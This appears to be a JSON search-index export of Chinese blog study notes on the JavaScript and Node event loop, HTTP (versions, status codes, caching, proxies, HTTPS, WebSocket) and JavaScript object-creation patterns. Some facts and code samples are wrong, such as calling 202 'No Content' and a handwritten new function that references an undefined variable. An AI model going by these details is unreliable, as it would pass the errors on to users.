queue，等待后续被调用，这些异步任务包括： process.nextTick (Node独有) Promise Object.observe MutationObserver 所以正确的一次 Event loop 顺序是这样的 执行同步代码，这属于宏任务 执行栈为空，查询是否有微任务需要执行 执行所有微任务 必要的话渲染 UI 然后开始下一轮 Event loop，执行宏任务中的异步代码 通过上述的 Event loop 顺序可知，如果宏任务中的异步代码有大量的计算并且需要操作 DOM的话，为了更快的响应界面响应，我们可以把操作 DOM 放入微任务中 最后上一个完整且比较复杂的例子 123456789101112131415161718192021222324252627282930313233343536console.log('1');setTimeout(function() &#123; console.log('2'); process.nextTick(function() &#123; console.log('3'); &#125;) new Promise(function(resolve) &#123; console.log('4'); resolve(); &#125;).then(function() &#123; console.log('5') &#125;)&#125;)process.nextTick(function() &#123; console.log('6');&#125;)new Promise(function(resolve) &#123; console.log('7'); resolve();&#125;).then(function() &#123; console.log('8')&#125;)setTimeout(function() &#123; console.log('9'); process.nextTick(function() &#123; console.log('10'); &#125;) new Promise(function(resolve) &#123; console.log('11'); resolve(); &#125;).then(function() &#123; console.log('12') &#125;)&#125;) 第一轮事件循环流程分析如下： 整体script作为第一个宏任务进入主线程，遇到console.log，输出1。 遇到setTimeout，其回调函数被分发到宏任务Event Queue中。我们暂且记为setTimeout1。 遇到process.nextTick()，其回调函数被分发到微任务Event Queue中。我们记为process1。 遇到Promise，new Promise直接执行，输出7。then被分发到微任务Event Queue中。我们记为then1。 又遇到了setTimeout，其回调函数被分发到宏任务Event Queue中，我们记为setTimeout2。上表是第一轮事件循环宏任务结束时各Event Queue的情况，此时已经输出了1和7。 我们发现了process1和then1两个微任务。执行process1,输出6。执行then1，输出8。 好了，第一轮事件循环正式结束，这一轮的结果是输出1，7，6，8。那么第二轮时间循环从setTimeout1宏任务开始： 首先输出2。接下来遇到了process.nextTick()，同样将其分发到微任务Event Queue中，记为process2。new Promise立即执行输出4，then也分发到微任务Event Queue中，记为then2。 第二轮事件循环宏任务结束，我们发现有process2和then2两个微任务可以执行。 输出3。输出5。第二轮事件循环结束，第二轮输出2，4，3，5。 第三轮事件循环开始，此时只剩setTimeout2了，执行。直接输出9。 将process.nextTick()分发到微任务Event Queue中。记为process3。 直接执行new Promise，输出11。 将then分发到微任务Event Queue中，记为then3。 第三轮事件循环宏任务执行结束，执行两个微任务process3和then3。 输出10。输出12。第三轮事件循环结束，第三轮输出9，11，10，12。 整段代码，共进行了三次事件循环，完整的输出为1，7，6，8，2，4，3，5，9，11，10，12。(请注意，node环境下的事件监听依赖libuv与前端环境不完全相同，输出顺序可能会有误差) Event Loop（NodeJS）timer timers 阶段会执行 setTimeout 和 setInterval 一个 timer 指定的时间并不是准确时间，而是在达到这个时间后尽快执行回调，可能会因为系统正在执行别的事务而延迟 I/O I/O 阶段会执行除了 close 事件，定时器和 setImmediate 的回调 poll poll 阶段很重要，这一阶段中，系统会做两件事情执行到点的定时器执行 poll 队列中的事件 并且当 poll 中没有定时器的情况下，会发现以下两件事情如果 poll 队列不为空，会遍历回调队列并同步执行，直到队列为空或者系统限制如果 poll 队列为空，会有两件事发生如果有 setImmediate 需要执行，poll 阶段会停止并且进入到 check 阶段执行 setImmediate如果没有 setImmediate 需要执行，会等待回调被加入到队列中并立即执行回调如果有别的定时器需要被执行，会回到 timer 阶段执行回调。 check check 阶段执行 setImmediate close callbacks close callbacks 阶段执行 close 事件 并且在 Node 中，有些情况下的定时器执行顺序是随机的","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"HTML、浏览器综合","slug":"技术/前端/HTML、浏览器综合","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/HTML%E3%80%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BB%BC%E5%90%88/"}],"tags":[]},{"title":"http","slug":"http","date":"2020-02-13T16:00:00.000Z","updated":"2024-05-25T04:21:29.895Z","comments":true,"path":"2020/02/14/http/","link":"","permalink":"https://wtaufpziv.github.io/2020/02/14/http/","excerpt":"Http简述HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。","text":"Http简述HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。 Http版本http0.9http于1990年问世，那时候并没有作为正式的标准被建立，因此称为HTTP/0.9 http1.01996年http正式作为标准被公布。该标准如今都被广泛用于服务端缺陷： 无法复用连接，完成即断开，重新慢启动和 TCP 3次握手 head of line blocking: 线头阻塞，导致请求之间互相影响 http 1.11997年公布的http1.1是如今主流的http主流协议版本较1.0的特点： 长连接：HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。 缓存处理：在HTTP1.0中主要使用header里的If-Modified-Since,Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。 带宽优化及网络连接的使用：HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。 Host头处理：在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。 http 2.0http1.1的缺点 HTTP/1.1使用的流水线技术也只能部分处理请求并发，仍然会存在队列头阻塞问题（线头阻塞），因此客户端在需要发起多次请求时，通常会采用建立多连接来减少延迟。 单向请求，只能由客户端发起。 请求报文与响应报文首部信息冗余量大。 数据未压缩，导致数据的传输量大。 http 2.0的特点二进制传输在HTTP1.x中，我们是通过文本的方式传输数据。基于文本的方式传输数据存在很多缺陷，文本的表现形式有多样性，因此要做到健壮性考虑的场景必然有很多，但是二进制则不同，只有0和1的组合，因此选择了二进制传输，实现方便且健壮。在HTTP2.0中引入了新的编码机制，所有传输的数据都会被分割，并采用二进制格式编码。 多路复用在一个TCP连接中存在多个流，即可以同时发送多个请求，对端可以通过帧中的表示知道该帧属于哪个请求。在客户端，这些帧乱序发送，到对端后再根据每个帧首部的流标识符重新组装。通过该技术，可以避免HTTP旧版本的队头阻塞问题，极大提高传输性能。 header压缩在HTTP1.0中，我们使用文本的形式传输header，在header中携带cookie的话，每次都需要重复传输几百到几千的字节，这着实是一笔不小的开销。在HTTP2.0中，我们使用了HPACK（HTTP2头部压缩算法）压缩格式对传输的header进行编码，减少了header的大小。并在两端维护了索引表，用于记录出现过的header，后面在传输过程中就可以传输已经记录过的header的键名，对端收到数据后就可以通过键名找到对应的值。 服务器push在HTTP2.0中，服务端可以在客户端某个请求后，主动推送其他资源。可以想象一下，某些资源客户端是一定会请求的，这时就可以采取服务端push的技术，提前给客户端推送必要的资源，就可以相对减少一点延迟时间。在浏览器兼容的情况下也可以使用prefetch。 更安全HTTP2.0使用了tls的拓展ALPN做为协议升级，除此之外，HTTP2.0对tls的安全性做了近一步加强，通过黑名单机制禁用了几百种不再安全的加密算法。 URI和URL各自的概念 URI：统一资源标识符 URL：统一资源定位符 URI用字符串标识某一互联网资源，而URL则表示资源的地点（互联网上所处的位置）。URL是URI的子集 Http报文结构与内容http报文本身是由多行（CRLF作为换行符）数据构成的字符串文本。http报文主要分文两大部分：报文首部和报文主体，两者之间有一个CRLF分割。报文首部有服务端或客户端需处理的请求或响应的内容及属性。报文主体是发送的数据 http请求报文 报文分为报文首部和报文主体 报文首部的第一行称为请求行，包括：请求方法、请求URI，http版本 首行之后是各种请求头，含有：通用头部，请求头部，实体头部（HTTP首部） 报文首部和报文主体之间有一个CRLF分隔 http响应报文 报文分为报文首部和报文主体 报文首部的第一行称为状态行，包括：http版本、状态码、状态说明 首行之后是若干行响应头，包括：通用头部，响应头部，实体头部（HTTP首部） 报文首部和报文主体之间有一个CRLF分隔 http首部字段：请求头和响应头http首部字段由首部字段名和字段值组成，中间用冒号分割 首部字段名：字段值 例如：Content-Type: text/html 另外，一个首部字段名可以对应多个值 例如：Keep-Alive:timeout=15,max=100 四种HTTP首部字段类型 通用首部字段请求和响应都会用到的字段 请求首部字段请求报文时使用的首部 响应首部字段响应报文时使用的首部 实体首部字段针对报文的实体部分使用的首部 通用首部字段 请求首部字段 响应首部字段 实体首部字段 非HTTP1.1首部字段Cookie，Set-Cookie，Content-Disposition 发送多种数据的多部分对象集合 multipart/form-data在Web表单文件上传时候使用 multipart/byteranges状态码206响应报文包含了多个范围的内容时使用（后面介绍）； 在HTTP报文中使用多部分对象集合时，需要在首部字段里加上Content-type； 使用boundary字符串来划分多部分对象集合指明的各类实体。在boundary字符串制定的各个实体的起始行之前插入“–”标记（比如：–AaB03x、–THIS_STRING_SEPARATES–）作为起始。–AaB03x–、–THIS_STRING_SEPARATES–作为结束 各部分对象集合的每个部分类型中，都可以含有首部字段； 获取部分内容的范围请求执行范围请求时，会用到首部字段Range来指定资源的byte范围，指定方法： 5001-10000字节 Range：bytes=5001-10000 5001之后全部 Range：bytes=5001- 从一开始到3000和5001到7000 Range：bytes=0-3000,, 5000-7000 对于范围请求，响应会返回状态码为206的响应报文，对于多重范围请求响应会在首部字段添加Content-type：multipart/byteranges 内容协商返回合适的内容内容协商机制是指客户端和服务端就响应的资源内容进行交涉，然后提供给客户端最为合适的资源。内容包括：语言、字符集、编码方式等等…三种内容协商技术： 服务器驱动协商以请求的首部字段作为参考，在服务器端自动处理 客户端驱动协商用户手动选择显示的方式，可以利用javascript脚本在页面上进行上述选择。比如根据OS类型，自动切换PC版页面和手机版页面 透明协商上述两者的结合 通常通过下面这些字段作为判断 Accept Accept-Charset Accept-Encoding Accept-Language Content-Language Http的状态码状态码的职责是当客户端向服务端发送请求时，描述返回的请求结果。状态码共分为下面这几类： 1XX：信息性状态码——接收的请求正在处理 2XX：成功状态码——请求正常处理完毕 3XX：重定向状态码——需要进行附加操作才能完成请求 4XX：客户端错误状态码——服务器无法处理请求 5XX：服务器错误状态码——服务器处理请求出错 2XX——成功200 OK从客户端发来的请求已经被正常处理了。一般用于GET和POST请求，对应请求资源的实体会作为响应返回 202 No Content服务器接收到请求已经成功处理，但返回的响应报文不含实体部分，也不允许返回任何实体。 206 Partial Content表示客户端进行了范围请求，而服务器成功执行了这部分的GET请求。 3XX——重定向301 Moved Permanently永久性重定向。表示请求的资源已经分配了新的URI，以后应该永远使用资源现在所指的URI。也就是说如果已经把资源对应的URI保存为书签了，这时应该按Location首部字段提示的URI重新保存。 使用首部字段location可以将响应接收方引导到某个与请求URI不同的资源。几乎所有的浏览器在接收到包含location首部字段的响应后，都会强制性地尝试对已提示的重定向资源的访问 302 Found临时重定向。表示请求的资源已经被分配了新的URI，希望用户本次使用新的URI访问。这个状态码与301相似，但是302状态码代表的资源不是被永久移动的，这意味着对应资源的URI之后还有可能发生改变，所以客户端保存的URI不发生改变 303 See Other表示由于请求的对应资源存在另一个URI，应使用GET方法定向获取请求资源。303和302有着相同的功能，但303明确规定客户端应该采用GET方法获取资源，这点上与302有所区别。当服务器希望客户端以GET方式重定向到另一个URI上时，返回303是一个比302更好的选择。 注意：现在几乎所有浏览器在遇到301,302,303时都会把POST改成GET，并删除请求报文的主体，之后再次发送。尽管302和303标准禁止这样做 304 Not Modified当客户端发送附带条件的请求（一般指采用GET方法请求的报文首部包含If-Match，If-Modified-Since，If-None-Match，If-Range， If-Unmodified-Since中任意首部字段），服务器允许访问资源，但是请求的条件未满足，则返回304简单来说，就是比如客户端之前的请求已经缓存了资源，当客户端再次请求时，会提供一个头信息指出客户端希望只返回在指定日期之后修改的资源（客户端想要更新资源），服务器查看资源，发现资源并没有发生改变，现在客户端缓存的资源依然没有过期，可以使用，于是返回304。304返回时不包含任何响应的主体。304虽然为3XX，但是和重定向没有任何关系。 307 Temporary Redirect临时重定向。这个状态码和302有相同的意义，只不过302标准禁止POST变为GET，但是307使用GET请求重定向 4XX——客户端错误400 Bad Request表示请求的报文当中存在语法错误。一般需要修改请求的内容之后再次发送请求。 401 Unauthorized该状态码表示发送的请求需要有HTTP认证（BASIC，DIGEST），若之前已经进行过请求，则表示认证失败。一般返回401的响应必须有包含一个适用于被请求资源的WWW-Authenticate首部字段，用于告知用户使用的资源认证方案和带有参数的质询（challenge） 403 Forbidden该状态码表示访问的资源被服务器拒绝了。未获取文件系统的访问权限，访问权限出现问题等情况都是403可能的原因。 404 Not Found该状态码表示服务器上无法找到请求的资源 5XX——服务端错误500 Internal Server Error该状态码表示服务器在执行请求时发生了错误，很可能是web应用存在bug或一些临时性故障 501 Not Implemented服务器不支持请求的功能，无法完成请求 502 Bad Gateway作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应 503 Service Unavailable表示服务器目前处于超载状态或停机维护，现在无法处理请求。 504 Gateway Time-out充当网关或代理的服务器，未及时从远端服务器获取请求 505 HTTP Version not supported服务器不支持请求的HTTP协议的版本，无法完成处理 缓存浏览器缓存是浏览器在本地磁盘对用户最近请求过的文档进行存储，当访问者再次访问同一页面时，浏览器就可以直接从本地磁盘加载文档。 在浏览器第一次发起请求时，本地无缓存，向web服务器发送请求，服务器起端响应请求，浏览器端缓存。在第一次请求时，服务器会将页面最后修改时间通过Last-Modified标识由服务器发送给客户端，客户端记录修改时间；服务器还会生成一个Etag，并发送给客户端。 缓存的两种方式缓存分为两种：强缓存和协商缓存，根据响应的header内容来决定。 浏览器请求某一资源时，会先获取该资源缓存的header信息，然后根据header中的Cache-Control和Expires来判断是否过期。若没过期则直接从缓存中获取资源信息，包括缓存的header的信息，所以此次请求不会与服务器进行通信。这里判断是否过期，则是强缓存相关。后面会讲Cache-Control和Expires相关。 如果显示已过期，浏览器会向服务器端发送请求，这个请求会携带第一次请求返回的有关缓存的header字段信息，比如客户端会通过If-None-Match头将先前服务器端发送过来的Etag发送给服务器，服务会对比这个客户端发过来的Etag是否与服务器的相同，若相同，就将If-None-Match的值设为false，返回状态304，客户端继续使用本地缓存，不解析服务器端发回来的数据，若不相同就将If-None-Match的值设为true，返回状态为200，客户端重新机械服务器端返回的数据；客户端还会通过If-Modified-Since头将先前服务器端发过来的最后修改时间戳发送给服务器，服务器端通过这个时间戳判断客户端的页面是否是最新的，如果不是最新的，则返回最新的内容，如果是最新的，则返回304，客户端继续使用本地缓存。 强缓存强缓存是利用http头中的Expires和Cache-Control两个字段来控制的，用来表示资源的缓存时间。 强缓存中，普通刷新会忽略它（点击浏览器的刷新就走协商缓存，不用强缓存），但不会清除它，需要强制刷新。浏览器强制刷新，请求会带上Cache-Control:no-cache和Pragma:no-cache ExpiresExpires是http1.0的规范，它的值是一个绝对时间的GMT格式的时间字符串。例如：expires:Fri, 14 Apr 2017 10:47:02 GMT。这个时间代表这这个资源的失效时间，只要发送请求时间是在Expires之前，那么本地缓存始终有效，则在缓存中读取数据。所以这种方式有一个明显的缺点，由于失效的时间是一个绝对时间，所以当服务器与客户端时间偏差较大时，就会导致缓存混乱。如果同时出现Cache-Control:max-age和Expires，那么max-age优先级更高 Cache-ControlCache-Control是在http1.1中出现的，主要是利用该字段的max-age值来进行判断，它是一个相对时间，例如Cache-Control:max-age=3600，代表着资源的有效期是3600秒。cache-control除了该字段外，还有下面几个比较常用的设置值： no-cache：不使用本地缓存。需要使用缓存协商，先与服务器确认返回的响应是否被更改，如果之前的响应中存在ETag，那么请求的时候会与服务端验证，如果资源未被更改，则可以避免重新下载。 no-store：直接禁止游览器缓存数据，每次用户请求该资源，都会向服务器发送一个请求，每次都会下载完整的资源。 public：可以被所有的用户缓存，包括终端用户和CDN等中间代理服务器。 private：只能被终端用户的浏览器缓存，不允许CDN等中继缓存服务器对其缓存。Cache-Control与Expires可以在服务端配置同时启用，同时启用的时候Cache-Control优先级高。 协商缓存协商缓存就是由服务器来确定缓存资源是否可用，所以客户端与服务器端要通过某种标识来进行通信，从而让服务器判断请求资源是否可以缓存访问。 普通刷新会启用弱缓存，忽略强缓存。只有在地址栏或收藏夹输入网址、通过链接引用资源等情况下，浏览器才会启用强缓存，这也是为什么有时候我们更新一张图片、一个js文件，页面内容依然是旧的，但是直接浏览器访问那个图片或文件，看到的内容却是新的。 这个主要涉及到两组header字段：Etag和If-None-Match、Last-Modified和If-Modified-Since Etag和If-None-MatchEtag/If-None-Match返回的是一个校验码。ETag可以保证每一个资源是唯一的，资源变化都会导致ETag变化。服务器根据浏览器上送的If-None-Match值来判断是否命中缓存。 与Last-Modified不一样的是，当服务器返回304 Not Modified的响应时，由于ETag重新生成过，response header中还会把这个ETag返回，即使这个ETag跟之前的没有变化。 Last-Modify/If-Modify-Since浏览器第一次请求一个资源的时候，服务器返回的header中会加上Last-Modify，Last-modify是一个时间标识该资源的最后修改时间，例如Last-Modify: Thu,31 Dec 2037 23:59:59 GMT。 当浏览器再次请求该资源时，request的请求头中会包含If-Modify-Since，该值为缓存之前返回的Last-Modify。服务器收到If-Modify-Since后，根据资源的最后修改时间判断是否命中缓存。 如果命中缓存，则返回304，并且不会返回资源内容，并且不会返回Last-Modify。 Last-Modified与ETag是可以一起使用的，服务器会优先验证ETag，一致的情况下，才会继续比对Last-Modified，最后才决定是否返回304。 通信数据转发程序代理接收客户端发送的请求后转发给服务器，代理不改变请求的URI，会直接发送给前方持有此资源的目标服务器。使用代理服务器一般可以： 利用缓存技术，减少网络流量 组织内部针对特定的网站进行访问控制，以获取访问日志为主要的目的 具体而言，代理服务器可以分为正向代理和反向代理服务器。代理服务又分为缓存代理和透明代理 正向代理在正向代理的过程中，隐藏了真实的客户端，即服务器端不知道客户端是谁。某些科学上网工具扮演的就是正向代理服务器：比如用浏览器访问：”http://www.google.com&quot;时被限制访问，你就可以在国外搭建一台代理服务器，通过这台代理服务器去请求www.google.com,代理服务器再把返回的响应内容返回给你。 反向代理反向代理过程中隐藏了真实服务器的信息，用户不需要知道是哪台服务器返回的信息，只要知道反向代理服务器是谁就行了。比如：用上文在国外搭建的代理服务器A访问:http://www.google.com，这里的A就相当于是一个客户端,www.google.com就是我们的反向代理服务器，反向代理服务器会把我们的请求转发给真实服务器，由真实服务器处理请求并返回资源到反向代理服务器，反向代理服务器再把资源转发给A。所以在整个过程中A并不知道是哪台服务器处理了请求，这样就很好的隐藏了真实服务器。 缓存代理预先将资源的副本缓存在代理服务器上，当代理再次接受到相同的资源请求，就可以使用缓存资源作为响应返回 透明代理转发请求时不对报文进行任何修改和加工 网关网关的的工作机制和代理十分相似，但网关有一些自己的特点 网关可以把http请求转换为其他协议的请求，提供非HTTP协议服务，比如可以链接数据库等，提高系统的的安全性 网关是转发其他服务器通信数据的服务器，就像自己拥有资源的源服务器一样对请求进行处理的 隧道建立安全的通信线路，配合SSL加密等手段进行安全通信，本身不解析http请求，保持原样中转给之后的服务器。好处：可以安全和远距离服务器安全通信，隧道本身透明，客户端不用在意隧道的存在 HTTPShttps和httphttp:: 超文本传输协议，是互联网上应用最为广泛的一种网络协议，是一个客户端和服务器端请求和应答的标准（TCP），用于从WWW服务器传输超文本到本地浏览器的传输协议，它可以使浏览器更加高效，使网络传输减少。https: 是以安全为目标的HTTP通道，简单讲是HTTP的安全版，即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。 http的缺陷 通信过程使用明文，内容可能会被窃听 不验证通信方身份，因此有可能遭遇伪装 无法证明报文完整性，可能遭到篡改 两者的区别 Https协议需要ca证书，费用较高，用于验证身份 http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。 使用不同的链接方式，端口也不同，一般而言，http协议的端口为80，https的端口为443 http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。 https：加密、认证、完整性保护https就是身披SSL外衣的http SSL加密方式：密钥共享密钥加密加密和解密共用一个密钥的方式称为共享密钥加密，也叫对称密钥加密。以共享密钥的方式加密时就必须把密钥也发送给对方，这样密钥就会有泄露的风险，密钥泄露那么加密也就没有了意义 公开密钥加密这种方式使用一对非对称密钥，一把私有密钥，一把公开密钥，发送密文的一方使用对方提供的公开密钥加密，对方收到密文之后在使用私有密钥解密。这种方式下只知道公开密钥和密文，想要还原信息原文是几乎不可能的。同时，这种方式下客户端收到公开密钥之后，需要使用证书来验证其真实性 https使用混合加密由于公开密钥加密相对于共享密钥，处理速度慢，因此https采用共享密钥和公开密钥两者混合的方式进行加密。在确保安全的情况下使用共享密钥 https通信机制 客户端发送ClientHello报文开始SSL通信，报文中包含客户端指定的SSL版本，加密组件，列表（所使用的加密算法和密钥长度等） 服务端可以进行SSL通信，返回一个ServerHello报文，包含SSL版本，加密组件（服务端返回的加密组件是从请求报文当中筛选的） 服务器发送Certificate报文，包含公开密钥和证书 服务端发送ServerHelloDone报文通知客户端，最初阶段的SSL握手协商部分结束 客户端随机生成Pre-master Secret（主要是通过RSA或者Diffie-Hellman算法生成）放入Client Key Exchange报文中。 使用证书携带的公开密钥对Client Key Exchange报文加密处理。 用Pre-master secret生成 master secre；还有生成CBC模式的初始向量（CBC模式第一次明文块做XOR的时候需要用到的初始向量，只要选择不同的初始向量，相同的密文加密后会形成不同的密文，这是目前应用最广泛的模式。CBC加密后的密文是上下文相关的，但如果一个分组丢失，后面的分组将全部作废，即同步错误）。 SSL握手第一次结束之后，验证公密有效性。客户端以ClientKeyExchange报文作为回应，报文中包含一种被称为Pre-master secret的随机密码串，报文已经使用3中的密钥加密 接着客户端继续发送ChangeCipherSpec报文，提示服务器此报文之后的通信使用Pre-master secret密钥加密 客户端发送Finished报文，包含连接至今全部报文的整体校验值。这次握手能否成功取决于服务器能否正确解密该报文 服务器发送ChangeCipherSpec报文 服务器发送Finished报文 服务器和客户端的Finished报文交换完毕，SSL连接建立完成，通信受到SSL保护，从此处开始http请求 开始通信 最后由客户端断开连接 CBC模式(Cipher Block Chaining) —— 又名密码分组链接模式。在此模式下，将前一个明文块加密处理后和下一个明文块做XOR运算，使之重叠，然后再对运算结果做加密处理。对第一个明文块做加密时，要么使用前一段密文的最后一块，要么利用外部生成的初始向量 http和https的选择与纯文本通信相比，加密通信会耗费更多的CPU和内存。所以非敏感信息使用http，敏感信息使用https除此之外，节约一部分购买证书的开销也是原因之一 使用浏览器进行全双工通信的WebSocketWebSocket协议这是一个建立在HTTP基础上的协议，因此连接的发起方依然是客户端，一旦建立了websocket连接，无论是客户端还是服务端都可以像对方发送信息。通信过程可以使用JSON，XML，HTML，图片等任意格式的数据 WebSocket特点 推送功能支持由服务器向客户端推送数据的功能，这样服务器可以直接发送数据而不用等待客户端的请求 减少通信量只要建立起WebSocket连接，就希望一直保持连接状态，这样每次连接的开销就减少了WebSocket通信步骤握手-请求为了实现WebSocket通信吗，需要用到HTTP报文的Upgrade字段，告知服务器通信协议发生改变，已达到握手的目的 GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==Sec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13Origin: http://example.com Sec-WebSocket-Key字段记录着握手过程不可少的键值Sec-WebSocket-Protocol字段记录使用的子协议以及Sec-WebSocket-Version 握手 - 响应对于之前的请求，返回状态码101的响应Sec-WebSocket-Accept字段由握手请求中的Sec-WebSocket-Key字段生成","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"计算机网络","slug":"技术/计算机通识/计算机网络","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[]},{"title":"面向对象的程序设计","slug":"面向对象的程序设计","date":"2020-02-11T16:00:00.000Z","updated":"2024-05-25T04:21:29.274Z","comments":true,"path":"2020/02/12/面向对象的程序设计/","link":"","permalink":"https://wtaufpziv.github.io/2020/02/12/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/","excerpt":"面向对象的程序设计","text":"面向对象的程序设计 创建对象的方法工厂模式1234567function createPerson(name, age, job)&#123; var o = new Object() o.name = name o.age = age o.job = job return o&#125; 缺点：无法识别对象类型，使用instanceof只能检测到Object 构造函数模式123456789function createPerson(name, age, job)&#123; this.name = name this.age = age this.job = job this.sayname = function()&#123; console.log(this.name) &#125;&#125;var p1 = new createPerson('tom', 20, 'teacher') 这种方式的特点： 没有显式地创建对象 直接将属性与方法赋值给函数的this 没有return new操作符的作用 创建一个新对象 将构造函数的this指向这个新对象 执行构造函数中的代码（为对象添加属性） 返回新对象 手写一个new123456function myNew(fun, ...arg)&#123; var obj = &#123;&#125; obj.__proto__ = fun.prototype fun.apply(obj, args) return obj instanceof Object ? obj : &#123;&#125;&#125; 123var p = new createPerson('tom', 20, 'teacher')p instanceof createPerson //truep instanceof Object //true 构造函数的使用 当做普通函数使用 12createPerson('tom', 20, 'teacher')//window调用window.sayname() //tom 当做构造函数使用 12var p = new createPerson('tom', 20, 'teacher')p.sayname() //tom 在其他对象的作用域内调用(new操作符就是用的这个形式) 123var o = &#123;&#125;createPerson.call(o, 'tom', 20, 'teacher')p.sayname() // tom 构造函数模式的问题不同实例的同名函数是不相等的解决方案： 123456789function sayname()&#123; console.log(this,name)&#125;function createPerson(name, age, job)&#123; this.name = name this.age = age this.job = job this.sayname = sayname&#125; 缺点：无封装性可言 原型模式构造函数，原型，实例的三角关系使用原型对象的好处是可以让所有实例共享同一个属性和方法而不用重新开辟内存 1234567function createPerson()&#123;&#125;createPerson.prototype.name = 'tom'createPerson.prototype.age = 20//实际上此时的构造函数已经成为了一个空函数var p = new createPerson()var p1 = new createPerson()//此时p和p1中的属性与方法是共享的 之所以可以这样写，是因为当访问实例的属性时，会进行搜索，首先搜索实例本身，如果找到就返回其值，否则搜索其原型对象。 注意：ES5中不可以通过实例更改原型中的属性 1234567function p()&#123;&#125;p.prototype.name = 'tom'var p1 = new p()var p2 = new p()p1.name = 'jack'p1.name // jackp2.name //tom 上述代码中p1.name = ‘jack’这条语句相当于给p1这个实例添加了那么属性，这个属性覆盖了原型中的name属性，并不会影响到原型本身。此时要想恢复访问原型中的属性，可以使用delete 12delete(p1.name)p1.name // tom 我们知道，hasOwnProperty()不检查原型，所以可以通过这个函数检测一个属性是来自于原型还是实例 in操作符我们之前知道for…in循环可以遍历对象自身和继承的可遍历属性。但in操作符单独使用时，用于判断是否可以通过对象访问指定属性，该访问会搜索原型 12345678910function p()&#123;&#125;p.prototype.name = 'tom'var p1 = new p()p1.age = 20p1.hasOwnProperty(name) //false'name' in p1 //truep1.hasOwnProperty(age) //true'age' in p1 //true 使用对象字面量的原型模式1234567function p()&#123;&#125;p.prototype = &#123; name:'tom', age:20, job:'teacher'&#125;var p1 = new p() 注意，这种方式会导致函数p的原型的构造函数，并不是p本身，也就是说破坏了三角关系中的constructor。虽然这并不影响instanceof操作符的使用，但也可以手动解决这个问题 12345678function p()&#123;&#125;p.prototype = &#123; constructor:p, name:'tom', age:20, job:'teacher'&#125;var p1 = new p() 当然也可以再严谨一点，因为默认的constructor是不可枚举的 1234Object.defineproperty(p.prototype, 'constructor', &#123; enumerable:false, value: p&#125;) 原型的动态性对原型对象的任何修改会立即体现到实例上，不会考虑代码的先后因素 123456var f = new p()p.prototype.sayname = function()&#123; console.log('tom')&#125;f.sayname() //tom//在p被实例化为f之后才为原型添加方法，但并不影响f使用它 原型和实例之间是通过指针连接的原型的动态性也随之带来一个问题，那就是上面的对象字面量重写原型，会导致三角关系中的[[proto]]破裂。之前是先重写原型，再new（没问题）现在是先new，再重写原型（出现问题） 123456789function p()&#123;&#125;var f = new p()p.prototype = &#123; constructor:p name:'tom', age:20, job:'taecher'&#125;f.name //找不到这个属性，报错 虽然重写了构造函数原型实例，但是原来的那个原型实例依然存在，并没有删除，而且new出来的对象依然引用这个最初的原型实例 